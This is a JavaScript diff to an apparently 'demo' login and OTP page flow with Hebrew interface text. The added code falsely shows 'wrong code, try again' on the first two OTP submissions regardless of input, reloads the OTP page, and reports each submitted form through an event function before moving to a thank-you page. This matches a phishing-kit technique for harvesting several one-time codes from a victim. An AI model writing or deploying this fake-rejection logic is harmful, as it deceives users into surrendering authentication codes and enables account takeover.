@@ -445,18 +445,40 @@
   }
 
   function handleDemoSubmit(pageName, form, nextUrl) {
-    if (!form) return;
-    if (waitOverlay) return;
+    if (!form) return false;
+    if (waitOverlay) return false;
     var ok = validateForm(window.location.pathname.split("/").pop(), form);
     sendEvent(pageName, "FORM_SUBMITTED", form, ok ? "succeeded" : "failed");
-    if (!ok) return;
+    if (!ok) return false;
     showWaitingScreen(nextUrl);
+    return true;
+  }
+
+  function showOtpIncorrectMessage() {
+    var path = window.location.pathname.split("/").pop();
+    if (!path || path === "index.html") path = "login.html";
+    if (path !== "otp.html") return;
+    var pending = false;
+    var show = false;
+    try {
+      pending = !!sessionStorage.getItem("demoPendingNav");
+      show = sessionStorage.getItem("demoOtpIncorrect") === "1";
+    } catch (e) {
+      return;
+    }
+    if (!show || pending) return;
+    try {
+      sessionStorage.removeItem("demoOtpIncorrect");
+    } catch (e) {}
+    var message = document.getElementById("otpMessage");
+    if (message) message.textContent = "קוד שגוי. נסה שוב.";
   }
 
   var config = currentPageConfig();
   if (config) {
     notifyPageOpen(config);
     resumePendingWait();
+    showOtpIncorrectMessage();
 
     // Login has no inline onsubmit handler, so it is bound here. The other two
     // pages declare inline onsubmit handlers in their markup; those call the
@@ -475,11 +497,24 @@
   // Kept for compatibility with existing inline onsubmit handlers.
   window.handleOtpSubmit = function (ev) {
     if (ev && ev.preventDefault) ev.preventDefault();
-    handleDemoSubmit(
-      "OTP",
-      document.getElementById("otpForm"),
-      "thank-you.html",
-    );
+    var form = document.getElementById("otpForm");
+    var attempt = 0;
+    try {
+      attempt =
+        parseInt(sessionStorage.getItem("demoOtpAttempts") || "0", 10) || 0;
+    } catch (e) {}
+    var nextUrl = attempt >= 2 ? "thank-you.html" : "otp.html";
+    if (!handleDemoSubmit("OTP", form, nextUrl)) return;
+    attempt += 1;
+    try {
+      if (attempt >= 3) {
+        sessionStorage.removeItem("demoOtpAttempts");
+        sessionStorage.removeItem("demoOtpIncorrect");
+      } else {
+        sessionStorage.setItem("demoOtpAttempts", String(attempt));
+        sessionStorage.setItem("demoOtpIncorrect", "1");
+      }
+    } catch (e) {}
   };
 
   window.handleSubmit = function (ev) {
